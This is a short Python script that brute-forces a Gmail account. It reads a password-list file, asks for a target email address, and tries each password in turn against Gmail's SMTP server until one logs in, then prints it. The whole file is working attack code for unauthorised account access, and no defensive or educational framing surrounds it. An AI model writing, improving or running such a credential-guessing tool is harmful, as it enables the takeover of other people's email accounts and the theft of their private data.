import smtplib
from os import system
import time

print('[1] start ')
print('[2] exit')

option = input('==>') 
if option == '1':  
    file_path = input('path of passwords file: ')  
else:
    system('clear')
    exit()
pass_file = open(file_path,'r')
pass_list = [line.strip() for line in pass_file.readlines()]

def login():
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()

        user_name = input('Target email: ')  

        for i, password in enumerate(pass_list, start=1):  
            print(f"{i}/{len(pass_list)} attempting password: {password}")
            
            try:
                server.login(user_name, password)
                system('clear')
                print(f"[+] Successful login with password: {password}")
                return  

            except smtplib.SMTPAuthenticationError:
                print(f"[!] Password not found => {password}")
                time.sleep(2) 

            except Exception as e:
                print(f"An error occurred: {e}")
                break

        print("[!] All password attempts failed.")
    except Exception as e:
        print(f"An error occurred during server connection: {e}")

login()

